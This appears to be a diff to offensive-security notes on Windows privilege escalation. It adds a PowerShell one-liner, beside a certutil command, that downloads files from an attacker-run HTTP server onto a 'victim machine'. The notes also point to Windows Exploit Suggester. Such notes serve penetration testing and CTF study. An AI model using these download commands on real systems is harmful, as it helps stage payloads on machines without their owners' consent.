@@ -4,7 +4,10 @@ First and foremost thing is to upload files on the system.
     Start server on attacker machine:
     >python3 -m http.server 80 #on attacker machine
     On victim machine:
+    1)Using certutil.exe
     >certutil.exe -urlcache -split -f http://<ip><port>/path/to/file
+    2)Using powershell
+    >powershell -c (New-Object Net.WebClient).DownloadFile('http://ip-addr:port/file', 'output-file')
 
 Easy way to check for privilege escalation vulnerabilties is to use [Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester) 
 Steps to use Windows-Exploit-Suggester
